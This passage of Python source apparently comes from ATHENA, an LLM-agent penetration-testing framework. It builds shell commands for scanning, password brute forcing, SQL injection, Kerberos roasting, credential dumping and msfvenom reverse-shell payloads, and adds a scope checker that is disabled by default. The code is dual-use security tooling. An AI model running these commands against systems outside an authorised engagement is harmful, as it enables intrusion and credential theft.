    """Faint informational line."""
    pad = " " * indent
    print(f"{pad}{_C_SYS}{message}{_C_RESET}")


def say_ok(message: str, *, indent: int = 3):
    pad = " " * indent
    print(f"{pad}{_C_OK}✓ {message}{_C_RESET}")


def say_warn(message: str, *, indent: int = 3):
    pad = " " * indent
    print(f"{pad}{_C_WARN}⚠ {message}{_C_RESET}")


def say_err(message: str, *, indent: int = 3):
    pad = " " * indent
    print(f"{pad}{_C_ERR}✕ {message}{_C_RESET}")


def say_thought(message: str, agent_role: str = "agent", *, indent: int = 6):
    """The LLM's chain-of-thought.  Distinct from agent decisions —
    this is the dim italic 'thinking aloud' voice."""
    pad = " " * indent
    color = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])["color"]
    # Each line of thought gets a small marker
    for line in message.split("\n"):
        line = line.strip()
        if not line:
            continue
        print(f"{pad}\033[{color}m\033[2m│{_C_RESET} \033[90m\033[3m{line}{_C_RESET}")


def speakers_legend() -> str:
    """Tiny legend bar showing what each voice means.  Printed once
    at the top of the help so the operator learns the symbol set."""
    return (
        f"   {_C_SYS}voices:{_C_RESET}  "
        f"{_C_PRIEST}{_C_BOLD}⚔ priest{_C_RESET} {_C_SYS}you{_C_RESET}  "
        f"{_C_ATHENA}{_C_BOLD}◈ ATHENA{_C_RESET} {_C_SYS}framework{_C_RESET}  "
        f"{_C_AGENT}{_C_BOLD}🔍 RECON{_C_RESET} {_C_SYS}AI agent{_C_RESET}  "
        f"{_C_EXEC}▌{_C_RESET} {_C_SYS}command{_C_RESET}  "
        f"{_C_OK}✓{_C_RESET} {_C_SYS}ok{_C_RESET}  "
        f"{_C_WARN}⚠{_C_RESET} {_C_SYS}warn{_C_RESET}  "
        f"{_C_ERR}✕{_C_RESET} {_C_SYS}error{_C_RESET}"
    )


# ═════════════════════════════════════════════════════════════════════
# TOOL WRAPPER LAYER  (ToolBuilder)
#
# Typed builders that produce shell strings.  The LLM picks the tool +
# arguments, we build the command.  This kills the v6.1 problem of the
# AI typing `nano`, `msfconsole` (interactive), `ssh user@host`, etc.,
# because the wrappers inherently produce non-interactive forms.
#
# All wrappers return a ready-to-execute shell string.
# ═════════════════════════════════════════════════════════════════════

class ToolBuilder:

    @staticmethod
    def nmap(target: str, ports: Optional[str] = None,
             scripts: Optional[Any] = None, version: bool = False,
             os_detect: bool = False, fast: bool = False,
             stealth: bool = False, top_ports: Optional[int] = None,
             udp: bool = False, min_rate: Optional[int] = None,
             output_file: Optional[str] = None,
             # v7.1 — common args the LLM actually emits
             ping_scan: bool = False, sn: bool = False,
             no_ping: bool = False, Pn: bool = False,
             aggressive: bool = False, A: bool = False,
             timing: Optional[int] = None,
             decoys: Optional[str] = None,
             source_port: Optional[int] = None,
             data_length: Optional[int] = None,
             fragment: bool = False,
             script_args: Optional[str] = None,
             extra_args: Optional[str] = None,
             # v7.2 — accept synonyms forwarded from KWARG_SYNONYMS
             _scan_type: Optional[str] = None,    # 'syn'|'connect'|'udp'|'ack'
             _open_only: bool = False) -> str:
        # v7.2 — normalise `scripts` if it arrived as a list / dict / weird repr.
        # Common LLM mistake: emits ["default"] which used to render as
        # --script=['default']  (Python list repr).  Always end up with a
        # comma-joined string.
        if scripts is not None:
            if isinstance(scripts, (list, tuple, set)):
                scripts = ",".join(str(x).strip() for x in scripts if str(x).strip())
            elif isinstance(scripts, dict):
                scripts = ",".join(str(x).strip() for x in scripts.keys())
            else:
                s = str(scripts).strip()
                # Strip stray python-list/json brackets and quotes
                if (s.startswith("[") and s.endswith("]")) or \
                   (s.startswith("(") and s.endswith(")")):
                    s = s[1:-1]
                s = s.replace("'", "").replace('"', "").strip()
                scripts = s
            if not scripts:
                scripts = None

        parts = ["nmap"]
        if stealth:
            parts.extend(["-T1", "--scan-delay", "5s"])
        elif timing is not None and 0 <= int(timing) <= 5:
            parts.append(f"-T{int(timing)}")
        elif fast:
            parts.append("-T4")
        if min_rate:
            parts.extend(["--min-rate", str(min_rate)])

        # v7.2 — explicit scan_type override beats heuristics
        scan_flag = None
        if _scan_type:
            stype = str(_scan_type).lower().strip().lstrip("-").lstrip("s")
            scan_flag_map = {
                "syn": "-sS", "ss": "-sS",
                "connect": "-sT", "tcp": "-sT", "st": "-sT",
                "udp": "-sU", "su": "-sU",
                "ack": "-sA", "sa": "-sA",
                "fin": "-sF", "sf": "-sF",
                "null": "-sN", "sn_scan": "-sN",
                "version": "-sV", "sv": "-sV",
            }
            scan_flag = scan_flag_map.get(stype)

        # ping/host-discovery flags (any of ping_scan/sn → -sn)
        if ping_scan or sn:
            parts.append("-sn")
        elif scan_flag:
            parts.append(scan_flag)
            if scan_flag == "-sU":
                udp = True
        elif udp:
            parts.append("-sU")
        else:
            parts.append("-sV" if version else "-sS")
        if no_ping or Pn:
            parts.append("-Pn")
        if aggressive or A:
            parts.append("-A")
        if os_detect:
            parts.append("-O")
        if fragment:
            parts.append("-f")
        if data_length:
            parts.extend(["--data-length", str(data_length)])
        if source_port:
            parts.extend(["--source-port", str(source_port)])
        if decoys:
            parts.extend(["-D", decoys])
        if scripts and not (ping_scan or sn):
            parts.append(f"--script={scripts}")
        if script_args:
            parts.extend(["--script-args", script_args])
        if top_ports and not (ping_scan or sn):
            parts.extend(["--top-ports", str(top_ports)])
        elif ports and not (ping_scan or sn):
            parts.extend(["-p", str(ports)])
        if _open_only:
            parts.append("--open")
        if output_file:
            parts.extend(["-oN", output_file])
        if extra_args:
            parts.append(str(extra_args))
        parts.append(target)
        return " ".join(parts)

    @staticmethod
    def rustscan(target: str, ports: str = "1-65535",
                 batch_size: int = 4500,
                 ulimit: Optional[int] = None,
                 nmap_args: str = "-sV") -> str:
        parts = ["rustscan", "-a", target, "-r", ports, "-b", str(batch_size)]
        if ulimit:
            parts.extend(["-u", str(ulimit)])
        parts.extend(["--", nmap_args])
        return " ".join(parts)

    @staticmethod
    def masscan(target: str, ports: str = "1-65535",
                rate: int = 1000, use_sudo: bool = True,
                interface: Optional[str] = None) -> str:
        parts = []
        if use_sudo:
            parts.append("sudo")
        parts.extend(["masscan", target, f"-p{ports}", f"--rate={rate}"])
        if interface:
            parts.extend(["-e", interface])
        return " ".join(parts)

    @staticmethod
    def gobuster_dir(url: str,
                     wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     extensions: str = "php,html,txt,bak,zip",
                     threads: int = 30,
                     status_codes: str = "200,204,301,302,307,401,403") -> str:
        return (f"gobuster dir -u {url} -w {wordlist} "
                f"-x {extensions} -t {threads} -s '{status_codes}' --no-error")

    @staticmethod
    def feroxbuster(url: str,
                    wordlist: str = "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                    extensions: str = "php,html,txt,bak,zip,old,bak.zip",
                    depth: int = 2, threads: int = 50,
                    filter_status: Optional[str] = None) -> str:
        cmd = (f"feroxbuster -u {url} -w {wordlist} -x {extensions} "
               f"-d {depth} -t {threads} --silent --no-state")
        if filter_status:
            cmd += f" --filter-status {filter_status}"
        return cmd

    @staticmethod
    def gobuster_vhost(url: str,
                       wordlist: str = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                       ) -> str:
        return f"gobuster vhost -u {url} -w {wordlist} --no-error"

    @staticmethod
    def ffuf(url: str, wordlist: str, location: str = "path",
            filter_codes: str = "404") -> str:
        if location == "path":
            return (f"ffuf -u {url}/FUZZ -w {wordlist} "
                    f"-fc {filter_codes} -t 40")
        elif location == "subdomain":
            return (f"ffuf -u {url} -H 'Host: FUZZ.{url}' "
                    f"-w {wordlist} -fc {filter_codes}")
        elif location == "param":
            return (f"ffuf -u {url}?FUZZ=test -w {wordlist} -fc {filter_codes}")
        return f"ffuf -u {url} -w {wordlist} -fc {filter_codes}"

    @staticmethod
    def whatweb(url: str, aggression: int = 3) -> str:
        return f"whatweb -a {aggression} --no-errors {url}"

    @staticmethod
    def nikto(target: str) -> str:
        return f"nikto -h {target} -ask no -nointeractive"

    @staticmethod
    def nuclei(target: str, severity: str = "medium,high,critical",
               templates: Optional[str] = None) -> str:
        cmd = f"nuclei -u {target} -severity {severity} -silent"
        if templates:
            cmd += f" -t {templates}"
        return cmd

    @staticmethod
    def hydra(target: str, service: str, userlist: str,
              passlist: str, port: Optional[int] = None,
              tasks: int = 4, stop_on_success: bool = True) -> str:
        cmd = f"hydra -L {userlist} -P {passlist} -t {tasks}"
        if stop_on_success:
            cmd += " -F"
        cmd += " -e nsr"  # try null, same as user, reverse user
        if port:
            cmd += f" -s {port}"
        cmd += f" {target} {service}"
        return cmd

    @staticmethod
    def sqlmap(url: str, batch: bool = True, level: int = 3,
               risk: int = 2, dbs: bool = True,
               random_agent: bool = True,
               cookie: Optional[str] = None) -> str:
        cmd = f"sqlmap -u '{url}' --level={level} --risk={risk}"
        if batch:
            cmd += " --batch"
        if random_agent:
            cmd += " --random-agent"
        if dbs:
            cmd += " --dbs"
        if cookie:
            cmd += f" --cookie='{cookie}'"
        return cmd

    @staticmethod
    def searchsploit(query: str, json_out: bool = False) -> str:
        cmd = f"searchsploit '{query}'"
        if json_out:
            cmd += " -j"
        return cmd

    @staticmethod
    def smbclient_list(target: str, anonymous: bool = True) -> str:
        if anonymous:
            return f"smbclient -L //{target}/ -N"
        return f"smbclient -L //{target}/"

    @staticmethod
    def crackmapexec(protocol: str, target: str,
                     user: Optional[str] = None,
                     password: Optional[str] = None,
                     hashes: Optional[str] = None,
                     userlist: Optional[str] = None,
                     passlist: Optional[str] = None,
                     module: Optional[str] = None,
                     extra: str = "") -> str:
        # Prefer netexec (nxc) if installed, fall back to crackmapexec
        binary = "nxc" if cmd_exists("nxc") else "crackmapexec"
        cmd = f"{binary} {protocol} {target}"
        if userlist and passlist:
            cmd += f" -u {userlist} -p {passlist}"
        elif user and password:
            cmd += f" -u {user} -p '{password}'"
        elif user and hashes:
            cmd += f" -u {user} -H {hashes}"
        if module:
            cmd += f" -M {module}"
        if extra:
            cmd += f" {extra}"
        return cmd

    @staticmethod
    def enum4linux(target: str) -> str:
        binary = "enum4linux-ng" if cmd_exists("enum4linux-ng") else "enum4linux"
        return f"{binary} -A {target}"

    @staticmethod
    def hashcat(hash_file: str, mode: int,
                wordlist: str = "/usr/share/wordlists/rockyou.txt",
                rules: Optional[str] = None,
                show_first: bool = True) -> str:
        if show_first:
            # cached hits returned instantly
            return f"hashcat -m {mode} {hash_file} {wordlist} --show"
        cmd = f"hashcat -m {mode} {hash_file} {wordlist}"
        if rules:
            cmd += f" -r {rules}"
        return cmd

    @staticmethod
    def hashid(hash_or_file: str) -> str:
        if os.path.exists(hash_or_file):
            return f"hashid {hash_or_file}"
        return f"echo '{hash_or_file}' | hashid"

    @staticmethod
    def curl_basic(url: str, head_only: bool = False,
                   user_agent: str = "Mozilla/5.0",
                   user: Optional[str] = None,
                   password: Optional[str] = None,
                   path_as_is: bool = False,
                   silent: bool = True) -> str:
        cmd = "curl"
        if silent:
            cmd += " -s"
        if head_only:
            cmd += " -I"
        cmd += f" -A '{user_agent}'"
        if user and password is not None:
            cmd += f" -u '{user}:{password}'"
        if path_as_is:
            cmd += " --path-as-is"
        cmd += f" '{url}'"
        return cmd

    @staticmethod
    def kerbrute_userenum(domain: str, dc_ip: str,
                          userlist: str = "/usr/share/seclists/Usernames/jsmith.txt"
                          ) -> str:
        return f"kerbrute userenum --dc {dc_ip} -d {domain} {userlist}"

    @staticmethod
    def impacket_asreproast(domain: str, dc_ip: str,
                            userlist: str) -> str:
        return (f"impacket-GetNPUsers '{domain}/' "
                f"-usersfile {userlist} -no-pass -dc-ip {dc_ip}")

    @staticmethod
    def impacket_kerberoast(domain: str, user: str, password: str,
                            dc_ip: str) -> str:
        return (f"impacket-GetUserSPNs '{domain}/{user}:{password}' "
                f"-dc-ip {dc_ip} -request")

    @staticmethod
    def impacket_secretsdump(domain: str, user: str,
                             password: str, dc_ip: str) -> str:
        return f"impacket-secretsdump '{domain}/{user}:{password}@{dc_ip}'"

    @staticmethod
    def msfvenom_payload(payload: str, lhost: str, lport: int = 4444,
                         fmt: str = "exe", out: str = "/tmp/shell.exe",
                         encoder: Optional[str] = None,
                         iterations: int = 0) -> str:
        cmd = (f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
               f"-f {fmt} -o {out}")
        if encoder:
            cmd += f" -e {encoder}"
        if iterations:
            cmd += f" -i {iterations}"
        return cmd

    @staticmethod
    def sslscan(target: str) -> str:
        return f"sslscan {target}"

    @staticmethod
    def testssl(target: str, severity: str = "MEDIUM") -> str:
        return f"testssl.sh --severity {severity} {target}"

    @staticmethod
    def dnsrecon(domain: str, dns_type: str = "std") -> str:
        return f"dnsrecon -d {domain} -t {dns_type}"

    @staticmethod
    def theharvester(domain: str, sources: str = "google,bing,crtsh,duckduckgo",
                     limit: int = 500) -> str:
        return f"theHarvester -d {domain} -b {sources} -l {limit}"


# ═════════════════════════════════════════════════════════════════════
# TOOL DISPATCH (v7.1)
#
# Maps tool names emitted by the LLM in [TOOL]name[/TOOL] tags to
# ToolBuilder methods.  When the LLM picks a tool here, args are typed
# and the shell string is constructed deterministically — no chance of
# hallucinated flags.  For ad-hoc commands the LLM still falls through
# to the [CMD] path.
# ═════════════════════════════════════════════════════════════════════

TOOL_DISPATCH = {
    "nmap":              ToolBuilder.nmap,
    "rustscan":          ToolBuilder.rustscan,
    "masscan":           ToolBuilder.masscan,
    "gobuster_dir":      ToolBuilder.gobuster_dir,
    "feroxbuster":       ToolBuilder.feroxbuster,
    "gobuster_vhost":    ToolBuilder.gobuster_vhost,
    "ffuf":              ToolBuilder.ffuf,
    "whatweb":           ToolBuilder.whatweb,
    "nikto":             ToolBuilder.nikto,
    "nuclei":            ToolBuilder.nuclei,
    "hydra":             ToolBuilder.hydra,
    "sqlmap":            ToolBuilder.sqlmap,
    "searchsploit":      ToolBuilder.searchsploit,
    "smbclient_list":    ToolBuilder.smbclient_list,
    "crackmapexec":      ToolBuilder.crackmapexec,
    "enum4linux":        ToolBuilder.enum4linux,
    "hashcat":           ToolBuilder.hashcat,
    "hashid":            ToolBuilder.hashid,
    "curl_basic":        ToolBuilder.curl_basic,
    "kerbrute_userenum": ToolBuilder.kerbrute_userenum,
    "impacket_asreproast":   ToolBuilder.impacket_asreproast,
    "impacket_kerberoast":   ToolBuilder.impacket_kerberoast,
    "impacket_secretsdump":  ToolBuilder.impacket_secretsdump,
    "msfvenom_payload":  ToolBuilder.msfvenom_payload,
    "sslscan":           ToolBuilder.sslscan,
    "testssl":           ToolBuilder.testssl,
    "dnsrecon":          ToolBuilder.dnsrecon,
    "theharvester":      ToolBuilder.theharvester,
}


# v7.2 — primary binary lookup per tool name.  Used by dispatch to do a
# pre-flight `which` check before generating the shell string.  This
# stops the LLM looping on "rustscan: not found"-style failures.
TOOL_BINARY = {
    "nmap":              "nmap",
    "rustscan":          "rustscan",
    "masscan":           "masscan",
    "gobuster_dir":      "gobuster",
    "feroxbuster":       "feroxbuster",
    "gobuster_vhost":    "gobuster",
    "ffuf":              "ffuf",
    "whatweb":           "whatweb",
    "nikto":             "nikto",
    "nuclei":            "nuclei",
    "hydra":             "hydra",
    "sqlmap":            "sqlmap",
    "searchsploit":      "searchsploit",
    "smbclient_list":    "smbclient",
    "crackmapexec":      None,  # special: nxc OR crackmapexec, handled below
    "enum4linux":        None,  # enum4linux OR enum4linux-ng
    "hashcat":           "hashcat",
    "hashid":            "hashid",
    "curl_basic":        "curl",
    "kerbrute_userenum": "kerbrute",
    "impacket_asreproast":   "impacket-GetNPUsers",
    "impacket_kerberoast":   "impacket-GetUserSPNs",
    "impacket_secretsdump":  "impacket-secretsdump",
    "msfvenom_payload":  "msfvenom",
    "sslscan":           "sslscan",
    "testssl":           "testssl.sh",
    "dnsrecon":          "dnsrecon",
    "theharvester":      "theHarvester",
}


def _tool_binary_present(tool_name: str) -> Tuple[bool, str]:
    """Return (present, suggested_install_or_alt).  v7.2."""
    if tool_name == "crackmapexec":
        if cmd_exists("nxc") or cmd_exists("crackmapexec"):
            return (True, "")
        return (False, "Install: pipx install netexec  (or apt install crackmapexec)")
    if tool_name == "enum4linux":
        if cmd_exists("enum4linux-ng") or cmd_exists("enum4linux"):
            return (True, "")
        return (False, "Install: apt install enum4linux-ng")
    binary = TOOL_BINARY.get(tool_name)
    if binary is None:
        # Unknown — be permissive
        return (True, "")
    if cmd_exists(binary):
        return (True, "")
    # A few common alternatives we can suggest
    alt_map = {
        "rustscan":   "Use 'nmap' instead — same surface, no extra install.",
        "masscan":    "Use 'nmap --min-rate 5000' instead — slower but no install.",
        "feroxbuster":"Use 'gobuster_dir' instead.",
        "nuclei":     "Use 'nikto' or curl-based checks instead.",
        "kerbrute":   "Install: go install github.com/ropnop/kerbrute@latest",
        "testssl.sh": "Use 'sslscan' instead.",
    }
    alt = alt_map.get(tool_name) or alt_map.get(binary) or f"Install: apt install {binary}"
    return (False, alt)


def _apply_kwarg_synonyms(name: str, args: Dict[str, Any]) -> Tuple[Dict[str, Any], List[str]]:
    """Map common LLM-emitted synonyms to the real builder param names.
    Returns (cleaned_args, list_of_remappings_done) for visibility."""
    syn_map = KWARG_SYNONYMS.get(name, {})
    remapped: List[str] = []
    out: Dict[str, Any] = {}
    for k, v in args.items():
        if k in syn_map:
            real = syn_map[k]
            if real is None:
                # silent drop — this is a recognised no-op alias
                remapped.append(f"{k}=<dropped>")
                continue
            # Avoid clobbering an explicit real-name arg
            if real not in args:
                out[real] = v
                remapped.append(f"{k}→{real}")
            else:
                # both supplied — prefer the canonical one already present
                remapped.append(f"{k}=<duplicate of {real}, ignored>")
        else:
            out[k] = v
    return (out, remapped)


def dispatch_tool(name: str, args_json: str) -> Tuple[Optional[str], Optional[str]]:
    """Resolve a [TOOL]/[ARGS] pair into a shell command.

    Returns (shell_string, msg) tuple:
      • (shell, None)         — clean success
      • (shell, "NOTE: ...")  — success with a note (e.g. synonyms remapped)
      • (None, "ERROR: ...")  — hard failure; caller MUST feed this back
                                 to the LLM in the next prompt so it can
                                 correct rather than loop.
    """
    if name not in TOOL_DISPATCH:
        available = ", ".join(sorted(TOOL_DISPATCH.keys()))
        return (None,
                f"ERROR: unknown tool '{name}'. Available: {available}. "
                f"Use [CMD] for ad-hoc commands.")

    # v7.2 — pre-flight binary check
    present, alt = _tool_binary_present(name)
    if not present:
        return (None,
                f"ERROR: tool '{name}' not installed on this system. "
                f"{alt}  Pivot to a different tool or use [CMD] with "
                f"something already available.")

    try:
        args = json.loads(args_json) if args_json else {}
    except json.JSONDecodeError as e:
        return (None,
                f"ERROR: bad JSON in [ARGS] for {name}: {e}. "
                f"Example: [ARGS]{{\"target\":\"10.0.0.5\"}}[/ARGS]")

    if not isinstance(args, dict):
        return (None,
                f"ERROR: [ARGS] must be a JSON object, got "
                f"{type(args).__name__}")

    # v7.2 — apply known synonyms first
    args, remapped = _apply_kwarg_synonyms(name, args)

    # Now check for kwargs that are STILL unknown after synonym mapping.
    fn = TOOL_DISPATCH[name]
    try:
        sig = inspect.signature(fn)
        # Builder methods may use _foo "private" params for synonym
        # forwarding (e.g. _scan_type).  These are valid kwargs.
        valid = set(sig.parameters.keys())
        accepts_kwargs = any(p.kind == inspect.Parameter.VAR_KEYWORD
                             for p in sig.parameters.values())
        unknown = [k for k in args.keys() if k not in valid] if not accepts_kwargs else []
    except (ValueError, TypeError):
        unknown = []

    if unknown:
        # Hard error fed back to LLM with the actual valid args listed
        try:
            sig = inspect.signature(fn)
            valid_list = []
            for pname, p in sig.parameters.items():
                if pname.startswith("_"):
                    continue  # hidden synonym slots
                if p.default is inspect.Parameter.empty:
                    valid_list.append(pname)
                else:
                    valid_list.append(f"{pname}={p.default!r}")
            valid_str = ", ".join(valid_list)
        except Exception:
            valid_str = "(introspection failed)"
        return (None,
                f"ERROR: {name} got unknown arg(s): {', '.join(unknown)}. "
                f"Valid args: {valid_str}. "
                f"Use [CMD] if {name} doesn't fit your need.")

    try:
        shell_str = fn(**args)
    except TypeError as e:
        # Missing required arg, or other signature problem
        try:
            sig = inspect.signature(fn)
            required = [p for p, info in sig.parameters.items()
                        if info.default is inspect.Parameter.empty
                        and not p.startswith("_")]
            return (None,
                    f"ERROR: bad args for {name}: {e}. Required: "
                    f"{', '.join(required) if required else '(none)'}.")
        except Exception:
            return (None, f"ERROR: bad args for {name}: {e}")
    except Exception as e:
        return (None, f"ERROR: {name} builder error: {e}")

    if not shell_str or not isinstance(shell_str, str):
        return (None, f"ERROR: {name} returned no command string")

    # Soft note for remappings (success path)
    if remapped:
        return (shell_str, f"NOTE: arg synonyms remapped: {', '.join(remapped)}")

    return (shell_str, None)


def tool_registry_for_prompt() -> str:
    """Compact registry summary so the LLM knows what's available
    structured.  Inspects each builder's signature to surface the
    expected args without us hardcoding it twice."""
    lines = ["STRUCTURED TOOLS (use [TOOL]name[/TOOL][ARGS]json[/ARGS]):"]
    for name, fn in sorted(TOOL_DISPATCH.items()):
        try:
            sig = inspect.signature(fn)
            params = []
            for pname, p in sig.parameters.items():
                # v7.2 — hide private synonym-forwarding params
                if pname.startswith("_"):
                    continue
                if p.default is inspect.Parameter.empty:
                    params.append(pname)
                else:
                    default = p.default
                    if isinstance(default, str):
                        params.append(f"{pname}='{default[:25]}'")
                    else:
                        params.append(f"{pname}={default}")
            lines.append(f"  {name}({', '.join(params)})")
        except (ValueError, TypeError):
            lines.append(f"  {name}(...)")
    return "\n".join(lines)


# ═════════════════════════════════════════════════════════════════════
# SCOPE / RoE ENFORCEMENT (v7.1)
#
# Scope is loaded from ~/.athena/scope.json (created on first run if
# missing).  Defines allowed CIDRs, allowed/blocked domains, and time
# windows.  Out-of-scope commands are refused before they hit
# subprocess.  Critical for legitimate engagements bound by SOWs.
# ═════════════════════════════════════════════════════════════════════

DEFAULT_SCOPE = {
    "enabled":  False,
    "allowed_cidrs":   ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"],
    "blocked_cidrs":   [],
    "allowed_domains": [],     # ["target.com", "*.target.com"]
    "blocked_domains": [],
    "time_window": {           # ISO-8601 strings; empty = no window
        "start": "",
        "end":   "",
    },
    "note": (
        "Set 'enabled' to true to enforce.  Out-of-scope commands "
        "will be refused before execution.  Wildcards (*.example.com) "
        "supported in domains.  Time window applies in local TZ."
    ),
}


@dataclass
class ScopeConfig:
    enabled: bool = False
    allowed_cidrs:   List[str] = field(default_factory=list)
    blocked_cidrs:   List[str] = field(default_factory=list)
    allowed_domains: List[str] = field(default_factory=list)
    blocked_domains: List[str] = field(default_factory=list)
    time_start: str = ""
    time_end:   str = ""

    @classmethod
    def load(cls, path: str = SCOPE_FILE) -> "ScopeConfig":
        # Create default if missing
        if not os.path.exists(path):
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w") as f:
                    json.dump(DEFAULT_SCOPE, f, indent=2)
            except Exception:
                pass
            return cls()
        try:
            with open(path) as f:
                data = json.load(f)
            tw = data.get("time_window", {}) or {}
            return cls(
                enabled=data.get("enabled", False),
                allowed_cidrs=data.get("allowed_cidrs", []),
                blocked_cidrs=data.get("blocked_cidrs", []),
                allowed_domains=data.get("allowed_domains", []),
                blocked_domains=data.get("blocked_domains", []),
                time_start=tw.get("start", ""),
                time_end=tw.get("end", ""),
            )
        except Exception as e:
            print(f"\033[33m   Scope file error ({e}) — proceeding with no scope\033[0m")
            return cls()

    def _domain_matches(self, host: str, patterns: List[str]) -> bool:
        host = host.lower().strip()
        for pat in patterns:
            pat = pat.lower().strip()
            if pat.startswith("*."):
                if host == pat[2:] or host.endswith(pat[1:]):
                    return True
            elif pat == host:
                return True
        return False

    def _ip_in_cidrs(self, ip: str, cidrs: List[str]) -> bool:
        try:
            ip_obj = ipaddress.ip_address(ip)
        except ValueError:
            return False
        for cidr in cidrs:
            try:
                if ip_obj in ipaddress.ip_network(cidr, strict=False):
                    return True
            except ValueError:
                continue
        return False

    def _check_time_window(self) -> Tuple[bool, str]:
        if not self.time_start and not self.time_end:
            return (True, "")
        now = datetime.datetime.now()
        if self.time_start:
            try:
                start = datetime.datetime.fromisoformat(self.time_start)
                if now < start:
                    return (False, f"Before window start ({self.time_start})")
            except ValueError:
                pass
        if self.time_end:
            try:
                end = datetime.datetime.fromisoformat(self.time_end)
                if now > end:
                    return (False, f"After window end ({self.time_end})")
            except ValueError:
                pass
        return (True, "")

    def check(self, cmd: str, target_hint: str = "") -> Tuple[bool, str]:
        """Return (allowed, reason).  If not enabled, always allowed."""
        if not self.enabled:
            return (True, "")

        # Time window first
        ok, reason = self._check_time_window()
        if not ok:
            return (False, f"Outside engagement time window: {reason}")

        # Pull every IP and bare-hostname from the command
        ips = set(re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', cmd))
        # Domains: filter out IPs and noise
        domain_candidates = set(re.findall(
            r'\b([a-zA-Z][a-zA-Z0-9\-_]*(?:\.[a-zA-Z0-9\-_]+)+)\b', cmd))
        domains = set()
        for d in domain_candidates:
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', d):
                continue
            if d.lower() in DOMAIN_NOISE:
                continue
            domains.add(d.lower())

        # Add the explicit target hint if any
        if target_hint:
            ip_match = re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_hint)
            if ip_match:
                ips.add(target_hint)
            else:
                domains.add(target_hint.lower())

        # If no targets present, treat as local/utility command — allow
        if not ips and not domains:
            return (True, "")

        # Check blocks first
        for ip in ips:
            if self._ip_in_cidrs(ip, self.blocked_cidrs):
                return (False, f"IP {ip} in blocked_cidrs")
        for d in domains:
            if self._domain_matches(d, self.blocked_domains):
                return (False, f"Domain {d} in blocked_domains")

        # Check allows (only if any allow rules exist)
        # Note: IP_NOISE filter is intentionally NOT applied here —
        # scope enforcement must check every target IP, even if it's
        # something like 8.8.8.8 that we'd normally ignore as noise
        # in finding extraction.
        has_ip_allow = bool(self.allowed_cidrs)
        has_dom_allow = bool(self.allowed_domains)

        if has_ip_allow:
            for ip in ips:
                if not self._ip_in_cidrs(ip, self.allowed_cidrs):
                    return (False, f"IP {ip} not in allowed_cidrs")

        if has_dom_allow:
            for d in domains:
                if not self._domain_matches(d, self.allowed_domains):
                    return (False, f"Domain {d} not in allowed_domains")

        return (True, "")

    def summary(self) -> str:
        lines = []
        state = "\033[32mENABLED\033[0m" if self.enabled else "\033[90mdisabled\033[0m"
        lines.append(f"Scope: {state}")
        if self.allowed_cidrs:
            lines.append(f"  allowed CIDRs:   {', '.join(self.allowed_cidrs)}")
        if self.blocked_cidrs:
            lines.append(f"  blocked CIDRs:   {', '.join(self.blocked_cidrs)}")
        if self.allowed_domains:
            lines.append(f"  allowed domains: {', '.join(self.allowed_domains)}")
        if self.blocked_domains:
            lines.append(f"  blocked domains: {', '.join(self.blocked_domains)}")
        if self.time_start or self.time_end:
            lines.append(f"  time window:     {self.time_start or '(open)'} → {self.time_end or '(open)'}")
        return "\n".join(lines)


# ═════════════════════════════════════════════════════════════════════
# ATTACK GRAPH (v7.1)
#
# Lightweight graph-based memory layered on top of findings.  Hosts,
# services, credentials, hashes, vulns are nodes.  Edges encode
# relationships: "service runs_on host", "cred works_on service",
# "vuln affects service", "host can_pivot_to host".  Used for surfacing
# pivot suggestions the LLM might miss in the flat finding list.
# ═════════════════════════════════════════════════════════════════════

class AttackGraph:
    """Wrapper around networkx.DiGraph with offsec-specific semantics.
    Falls through to no-op stubs if networkx isn't installed so the
    rest of Athena keeps working."""

    NODE_HOST    = "host"
    NODE_SVC     = "service"
    NODE_CRED    = "credential"
    NODE_HASH    = "hash"
    NODE_VULN    = "vuln"
    NODE_USER    = "user"
    NODE_DOMAIN  = "domain"

    EDGE_RUNS_ON = "runs_on"        # service -> host
    EDGE_WORKS   = "works_on"       # cred -> service
    EDGE_FOR     = "for_user"       # cred -> user
    EDGE_AFFECTS = "affects"        # vuln -> service
    EDGE_PIVOT   = "can_pivot_to"   # host -> host
    EDGE_BELONGS = "in_domain"      # host -> domain

    def __init__(self):
        if HAS_NETWORKX:
            self.g = nx.DiGraph()
        else:
            self.g = None

    def _has(self) -> bool:
        return self.g is not None

    def add_host(self, ip: str, **attrs):
        if not self._has() or not ip:
            return
        self.g.add_node(f"host:{ip}", kind=self.NODE_HOST, label=ip, **attrs)

    def add_service(self, host_ip: str, port: int, name: str = "", version: str = ""):
        if not self._has() or not host_ip:
            return
        sid = f"svc:{host_ip}:{port}"
        self.g.add_node(sid, kind=self.NODE_SVC,
                        label=f"{port}/{name}" if name else str(port),
                        version=version, port=port)
        self.g.add_edge(sid, f"host:{host_ip}", kind=self.EDGE_RUNS_ON)

    def add_credential(self, value: str, user: str = "",
                       host: str = "", verified: bool = False):
        if not self._has() or not value:
            return
        cid = f"cred:{value[:24]}"
        self.g.add_node(cid, kind=self.NODE_CRED, label=value[:32],
                        verified=verified)
        if user:
            uid = f"user:{user}"
            self.g.add_node(uid, kind=self.NODE_USER, label=user)
            self.g.add_edge(cid, uid, kind=self.EDGE_FOR)
        if host:
            self.g.add_edge(cid, f"host:{host}", kind=self.EDGE_WORKS)

    def add_hash(self, value: str, htype: str, user: str = ""):
        if not self._has() or not value:
            return
        hid = f"hash:{value[:16]}"
        self.g.add_node(hid, kind=self.NODE_HASH,
                        label=f"{htype}:{value[:12]}…", htype=htype)
        if user:
            uid = f"user:{user}"
            self.g.add_node(uid, kind=self.NODE_USER, label=user)
            self.g.add_edge(hid, uid, kind=self.EDGE_FOR)

    def add_vuln(self, cve: str, host: str = "", service_port: Optional[int] = None):
        if not self._has() or not cve:
            return
        vid = f"vuln:{cve}"
        self.g.add_node(vid, kind=self.NODE_VULN, label=cve)
        if host and service_port:
            self.g.add_edge(vid, f"svc:{host}:{service_port}", kind=self.EDGE_AFFECTS)
        elif host:
